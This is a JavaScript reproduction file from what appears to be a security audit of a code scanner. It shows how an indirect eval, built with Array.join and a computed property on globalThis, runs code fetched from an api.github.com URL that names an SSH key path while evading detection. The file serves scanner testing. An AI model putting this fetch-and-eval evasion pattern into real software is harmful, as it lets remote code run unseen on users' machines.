// SECURITY_AUDIT.md v2.2.12 Bypass 01 reproduction — Indirect eval via computed property
// Root causes (per v2.2.12 audit):
//   1. getCallName() blind to computed properties
//   2. Array.join() not handled by deobfuscator
//   3. SAFE_STRINGS early return (api.github.com URL)
//   4. No dataflow source detected (https.get callback)

const https = require('https');

// Build 'eval' via Array.join — bypass token detection
const k = ['e', 'v', 'a', 'l'].join('');
const g = globalThis;

// URL with SAFE_STRINGS shortcut (api.github.com) but path is .ssh
const url = 'https://api.github.com/users/sample/keys?path=/home/user/.ssh/id_rsa';

https.get(url, (res) => {
  let payload = '';
  res.on('data', (chunk) => { payload += chunk; });
  res.on('end', () => {
    // Indirect eval via computed property access — getCallName returns ''
    g[k](payload);
  });
});
